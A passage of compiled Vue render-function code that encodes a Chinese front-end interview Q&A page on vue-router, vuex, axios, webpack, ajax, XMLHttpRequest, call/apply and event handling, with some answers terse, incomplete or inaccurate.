嵌套路由怎么定义？")])])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("vue-router模块的router-")]),t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("link")])]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("组件。")]),t("span",{staticStyle:{background:"rgb(255,255,255)"}},[n._v("children数组来定义子路由")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("15")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("vue-router的动态路由？怎么获取传过来的动态参数？")])])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("router目录下的index.js文件中，对path属性加上/:")]),t("span",{staticStyle:{color:"rgb(0,134,179)"}},[n._v("id")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("router对象的params.")]),t("span",{staticStyle:{color:"rgb(0,134,179)"}},[n._v("id")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("16")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("vue-router有哪几种导航钩子？")])])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("router.beforeEach(")]),t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("to")])]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v(",")]),t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("from")])]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v(",")]),t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("next")])]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v(")，")])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("作用：跳转前进行判断拦截。第二种：组件内的钩子；第三种：单独路由独享组件")])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}})]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("1")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("7")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("vue-router是什么？它有哪些组件？")])])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("vue用来写路由一个插件。router-link、router-")]),t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("view")])])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}})]),t("p",[t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("18、")]),t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}},[n._v("vuex的？")])])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("vuex可以理解为一种")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("状态管理的")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("开发模式或")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("者")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("框架")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("，")]),t("span",{staticStyle:{color:"rgb(85,85,85)",background:"rgb(255,255,255)"}},[n._v("data中的属性需要共享给其他vue组件使用")]),t("span",{staticStyle:{color:"rgb(85,85,85)",background:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(51,51,51)"}}),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[t("span",{staticStyle:{"font-family":"'华文仿宋'"}},[n._v("为")]),n._v("state")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("store中； 改变状态的方式是提交mutations，这是个同步的事物；\n        异步逻辑应该封装在action中")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("。")])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}})]),t("p",[t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("19、")]),t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}},[n._v("vuex有哪几种属性？")])])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v(" State、 Getter、Mutation 、")]),t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("Action")])]),t("span",{staticStyle:{color:"rgb(51,51,51)"}}),t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("Module")])])]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(238,238,238)"}},[n._v("state => 基本数据")]),t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(238,238,238)"}},[n._v("(")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("数据源存放地")]),t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(238,238,238)"}},[n._v(")")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}},[t("br")]),t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(238,238,238)"}},[n._v("getters => 从基本数据派生")]),t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(238,238,238)"}}),t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(238,238,238)"}}),t("span",{staticStyle:{color:"rgb(0,0,0)"}},[t("br")]),t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(238,238,238)"}}),t("span",{staticStyle:{color:"rgb(0,0,0)"}},[t("br")]),t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(238,238,238)"}}),t("span",{staticStyle:{color:"rgb(0,0,0)"}},[t("br")]),t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(238,238,238)"}},[n._v("modules => 模块化Vuex")])]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(238,238,238)"}})]),t("p",[t("strong",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(238,238,238)"}},[n._v("20、")]),t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}},[n._v("5、Vue.js中ajax请求代码应该写在组件的methods中还是vuex的actions中？")])])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("vuex 的")]),t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("state")])]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("里。")])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("action里，方便复用")])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}})]),t("p",[t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}},[n._v("21")]),t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}},[n._v("axios是什么？怎么使用？")])])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("npm install axios -")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("-save")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("装好，")])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("js中使用")]),t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("import")])]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v(".")]),t("span",{staticStyle:{color:"rgb(0,134,179)"}},[n._v("get")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v(".post。返回在.then函数中如果成功，失败则是在.")]),t("span",{staticStyle:{color:"rgb(0,134,179)"}},[n._v("catch")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("函数中")])]),t("p",[t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}})])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("22")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("axios+tp5进阶中，调用axios.post(‘api/user’)是进行的什么操作？axios.put(‘api/user/8′)呢？")])])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("答：添加用户操作，更新操作。")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("23")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("RESTful API？怎么使用?")])])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("api的标准，无状态请求。请求的路由地址是固定的，")])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("tp5则先路由配置中把资源路由配置好。标准有：")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}}),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v(".post")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}}),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v(".put")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}}),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v(".delete")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("24")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("vuex是什么？怎么使用？哪种功能场景使用它？")])])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("vue框架中状态管理。在main.js引入store，注入。")])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("store")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v(".js")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("….. ")]),t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("export")])]),t("span",{staticStyle:{color:"rgb(51,51,51)"}})]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("场景有：单页应用中，组件之间的状态。音乐播放、登录状态、加入购物车")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("25")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("、")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("webpack?")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}})])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("答：")]),t("span",{staticStyle:{color:"rgb(47,47,47)",background:"rgb(255,255,255)"}},[n._v("WebPack可以看做是")]),t("strong",[t("span",{staticStyle:{color:"rgb(47,47,47)",background:"rgb(255,255,255)"}})]),t("span",{staticStyle:{color:"rgb(47,47,47)",background:"rgb(255,255,255)"}},[n._v("JavaScript模块以及其它的一些浏览器不能直接运行的拓展语言（Scss，TypeScript等），并将其转换和打包为合适的格式供浏览器使用。")])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v(".vue文件的一个加载器，")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("将")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("template/")]),t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("js")])]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("/style转换成")]),t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("js")])]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("模块。")])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("用途：")]),t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("js")])]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("es6、style样式可以scss或less、template可以加jade等")])]),t("p",[t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}})])]),t("p",[t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}})])]),t("p",[t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("26、说几个ajax返回error的原因")])])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("1、")]),t("span",{staticStyle:{color:"rgb(75,75,75)",background:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}},[n._v("dataType")]),t("span",{staticStyle:{color:"rgb(75,75,75)",background:"rgb(255,255,255)"}})]),t("p",[t("span",{staticStyle:{color:"rgb(75,75,75)"}},[n._v("dataType类型和前台写的不一致会跳入error")])]),t("p",[t("span",{staticStyle:{color:"rgb(75,75,75)"}},[n._v("jquery1.4之后对json的格式要求非常严格，json格式错误也会跳入error")])]),t("p",[t("span",{staticStyle:{color:"rgb(75,75,75)"}},[n._v("2、")]),t("span",{staticStyle:{color:"rgb(75,75,75)"}},[n._v("data不能不写")])]),t("p",[t("span",{staticStyle:{color:"rgb(75,75,75)"}},[n._v('data为空也一定要传"{}"；不然返回的是xml格式的。')])]),t("p",[t("span",{staticStyle:{color:"rgb(75,75,75)"}},[n._v("3")]),t("span",{staticStyle:{color:"rgb(75,75,75)"}},[n._v(".")]),t("span",{staticStyle:{color:"rgb(75,75,75)"}},[n._v("、")]),t("span",{staticStyle:{color:"rgb(75,75,75)"}},[n._v("传递的参数")])]),t("p",[t("span",{staticStyle:{color:"rgb(75,75,75)"}},[n._v("ajax支持的编码格式")])]),t("p",[t("span",{staticStyle:{color:"rgb(75,75,75)"}},[n._v("4、")]),t("span",{staticStyle:{color:"rgb(75,75,75)"}})]),t("p",[t("span",{staticStyle:{color:"rgb(75,75,75)"}},[n._v("路径不能有中文")])]),t("p",[t("span",{staticStyle:{color:"rgb(75,75,75)",background:"rgb(255,255,255)"}})]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("strong",[t("span",{staticStyle:{color:"rgb(75,75,75)"}},[n._v("27、")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("XMLHttpRequest")]),t("span",{staticStyle:{color:"rgb(75,75,75)"}},[n._v("XMLHttpRequest.readyState: 状态码的意思")])])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(75,75,75)"}},[n._v("0 － （未初始化）还没有调用send()方法")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(75,75,75)"}},[n._v("1 － （载入）已调用send()方法，正在发送请求")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(75,75,75)"}},[n._v("2 － （载入完成）send()方法执行完成，已经接收到全部响应内容")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(75,75,75)"}},[n._v("3 － （交互）正在解析响应内容")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(75,75,75)"}},[n._v("4 － （完成）响应内容解析完成，可以在客户端调用了")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(75,75,75)"}})]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("strong",[t("span",{staticStyle:{color:"rgb(75,75,75)"}},[n._v("28、")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("vue.cli项目中src目录每个文件夹和文件的用法？")])])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("答：")]),t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("assets")])]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("文件夹是放静态资源；")]),t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("components")])]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("是放组件；")]),t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("router")])]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v(";")]),t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}})]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v(".vue")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("是一个应用主组件；")]),t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("main")])]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v(".js")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("是入口文件")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("strong",[t("span",{staticStyle:{color:"rgb(75,75,75)"}},[n._v("29、")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("vue.cli中怎样使用自定义的组件？有遇到过哪些问题吗？")])])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("components目录新建你的组件文件（")]),t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("smithButton.vue），script一定要export\n        ")])]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("default {")])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("第二步：在需要用的页面（组件）中导入：")]),t("strong",[t("span",{staticStyle:{color:"rgb(153,153,153)"}},[n._v("import")])]),t("span",{staticStyle:{color:"rgb(51,51,51)"}}),t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("smithButton ")])]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("from ‘../components/")]),t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("smithButton.vue’")])])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("vue的子组件的components属性上面,components:{")]),t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("smithButton}")])])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("template视图view中使用，<")]),t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("smith-button> ")])]),t("span",{staticStyle:{color:"rgb(51,51,51)"}}),t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("smith-button>")])])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("问题有：")]),t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("smithButton命名，使用的时候则smith-button。")])])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("strong",[t("span",{staticStyle:{color:"rgb(75,75,75)"}},[n._v("30、")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("element.ui吗？说下它其中两个组件的使用方法？")])])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("答：使用过")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("；")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("用过一个布局的，它是由")]),t("span",{staticStyle:{color:"rgb(0,128,128)"}},[n._v("24")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v(":span后面带的数字它占")]),t("span",{staticStyle:{color:"rgb(0,128,128)"}},[n._v("24")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v(":offset是它的间距，后面也是跟数字，也是从")]),t("span",{staticStyle:{color:"rgb(0,128,128)"}},[n._v("24")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("份里面取的。")])]),t("p",[t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("input")])]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("el-")]),t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("input")])]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("，后面")]),t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("type")])]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("跟上一个属性就是显示不同按钮的类型，有默认的")]),t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("default")])]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("success（成功的）、warning（警告）、danger（危险）、info（）、primary（）")])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}})]),t("p",[t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("31、")]),t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}},[n._v("vue框架？")])])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("答：")]),t("span",{staticStyle:{color:"rgb(0,128,128)"}},[n._v("1")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("、数据信息量比较多的。")])]),t("p",[t("span",{staticStyle:{color:"rgb(0,128,128)"}},[n._v("2")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("web和app应用多端共用一套界面的项目，因为使用vue.cli+webpack后的前端目录，非常有利于项目的跨平台部署。")])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}})]),t("p",[t("strong",[t("span",{staticStyle:{color:"rgb(75,75,75)"}},[n._v("32、")]),t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}},[n._v("PC端项目你会在哪些场景使用Vue框架？")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("vue为什么解决这些问题呢？")])])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("dom操作")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("js和html都会有列表的html布局，迭代很困难。再一个dom节点的大面积添加会影响性能。")])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("v-for在view层一个地方遍历数据即可")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("。")])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("vue通过Virtual Dom就是在")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("js中模拟DOM对象树来优化DOM操作。")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("strong",[t("span",{staticStyle:{color:"rgb(75,75,75)"}})])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("strong",[t("span",{staticStyle:{color:"rgb(75,75,75)"}},[n._v("33、call（） 和 apply（） 的作用和区别？")])])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("strong",[t("span",{staticStyle:{color:"rgb(75,75,75)"}},[n._v("答：")])]),t("span",{staticStyle:{color:"rgb(51,51,51)"}})]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("blackCat.say.call(whiteDog)")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}})]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("call(thisObj，arg1,arg2)")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(51,51,51)"}}),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("A")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("pply(thisObj，[arg1,arg2])")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(51,51,51)"}})]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("34、举例说ES6有哪些的新功能？")])])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("strong",[t("span",{staticStyle:{color:"rgb(75,75,75)"}})])]),t("p",[t("strong",[t("span",{staticStyle:{color:"rgb(75,75,75)"}},[n._v("35")]),t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(44,44,44)",background:"rgb(255,255,255)"}},[n._v("ajax请求的时候get 和post方式的区别")])])]),t("p",[t("span",{staticStyle:{background:"rgb(255,255,255)"}},[n._v("G")]),t("span",{staticStyle:{background:"rgb(255,255,255)"}},[n._v("et 一般用于获取信息")])]),t("p",[t("span",{staticStyle:{background:"rgb(255,255,255)"}},[n._v("URL传递参数")])]),t("p",[t("span",{staticStyle:{background:"rgb(255,255,255)"}},[n._v("2000字符")])]),t("p",[t("span",{staticStyle:{background:"rgb(255,255,255)"}},[n._v("P")]),t("span",{staticStyle:{background:"rgb(255,255,255)"}},[n._v("ost 一般用于修改服务器资源（新建，或者 修改）")])]),t("p",[t("span",{staticStyle:{background:"rgb(255,255,255)"}})]),t("p",[t("span",{staticStyle:{background:"rgb(255,255,255)"}})]),t("p",[t("strong",[t("span",{staticStyle:{color:"rgb(75,75,75)"}},[n._v("36、")]),t("span",{staticStyle:{color:"rgb(44,44,44)",background:"rgb(255,255,255)"}},[n._v("JavaScript中如何检测一个变量是一个String类型？请写出函数实现\n        ")])])]),t("p",[t("span",{staticStyle:{color:"rgb(44,44,44)",background:"rgb(255,255,255)"}})]),t("p",[t("span",{staticStyle:{color:"rgb(44,44,44)",background:"rgb(255,255,255)"}},[n._v("return typeof(obj) == ")]),t("span",{staticStyle:{color:"rgb(44,44,44)",background:"rgb(255,255,255)"}},[n._v("“")]),t("span",{staticStyle:{color:"rgb(44,44,44)",background:"rgb(255,255,255)"}},[n._v("string")]),t("span",{staticStyle:{color:"rgb(44,44,44)",background:"rgb(255,255,255)"}},[n._v("”")]),t("span",{staticStyle:{color:"rgb(44,44,44)",background:"rgb(255,255,255)"}},[n._v(";\n      ")])]),t("p",[t("span",{staticStyle:{color:"rgb(44,44,44)",background:"rgb(255,255,255)"}},[n._v("}")])]),t("p",[t("strong",[t("span",{staticStyle:{color:"rgb(44,44,44)",background:"rgb(255,255,255)"}},[n._v("37、")]),t("span",{staticStyle:{background:"rgb(255,255,255)"}},[n._v("JSON 的了解？")])]),t("br"),t("span",{staticStyle:{background:"rgb(255,255,255)"}},[n._v("JSON(JavaScript Object Notation)\n        是一种轻量级的数据交换格式。它是基于JavaScript的一个子集。数据格式简单,\n        易于读写, 占用带宽小。")]),t("br"),t("span",{staticStyle:{background:"rgb(255,255,255)"}},[n._v("{'age':'12', 'name':'back'}")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("strong",[t("span",{staticStyle:{color:"rgb(44,44,44)"}},[n._v("38")]),n._v("如何阻止事件冒泡和默认事件")])]),t("p",[t("strong",[n._v("阻止事件冒泡：")]),t("span",{staticStyle:{background:"rgb(248,248,255)"}},[n._v("event.stopPropagation();\n      ")])]),t("p",[t("span",{staticStyle:{background:"rgb(248,248,255)"}}),t("strong",[n._v("默认事件：")]),t("span",{staticStyle:{background:"rgb(248,248,255)"}},[n._v("event.preventDefault();")])]),t("p",[t("span",{staticStyle:{background:"rgb(248,248,255)"}}),t("strong",[t("span",{staticStyle:{background:"rgb(248,248,255)"}},[n._v("return")]),t("span",{staticStyle:{background:"rgb(248,248,255)"}}),t("span",{staticStyle:{background:"rgb(248,248,255)"}},[n._v("false")])]),t("span",{staticStyle:{background:"rgb(248,248,255)"}})]),t("p",[t("span",{staticStyle:{background:"rgb(248,248,255)"}})]),t("p",{attrs:{align:"justify"}},[t("strong",[t("span",{staticStyle:{color:"rgb(44,44,44)",background:"rgb(255,255,255)"}},[n._v("39、")]),t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}},[n._v("A")]),t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}},[n._v("jax数据格式")])])]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(253,252,248)"}},[n._v("HTML、XML 或 JSON")]),t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(253,252,248)"}})]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(253,252,248)"}})]),t("p",{attrs:{align:"justify"}},[t("strong",[t("span",{staticStyle:{color:"rgb(75,75,75)"}},[n._v("40、")]),n._v("window.load和$(document).ready()的区别")])]),t("p"),t("p",[n._v("Dom就绪就可以访问，但并不意味着，元素所有的关联文件已经下载完毕。")]),t("p"),t("p",[t("strong",[n._v("41、"),t("span",{staticStyle:{color:"rgb(44,44,44)"}},[n._v("css定义")])])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}},[n._v("@media ")]),t("span",{staticStyle:{color:"rgb(44,44,44)"}},[n._v("screen")]),t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}})]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(44,44,44)"}},[n._v("@media")]),t("span",{staticStyle:{color:"rgb(44,44,44)"}}),t("span",{staticStyle:{color:"rgb(44,44,44)"}},[n._v("(min-width:768px) and (max-width:979px)")])]),t("p",[t("strong",[t("span",{staticStyle:{color:"rgb(44,44,44)"}})])]),t("p",[n._v("42"),t("strong",[n._v("$this 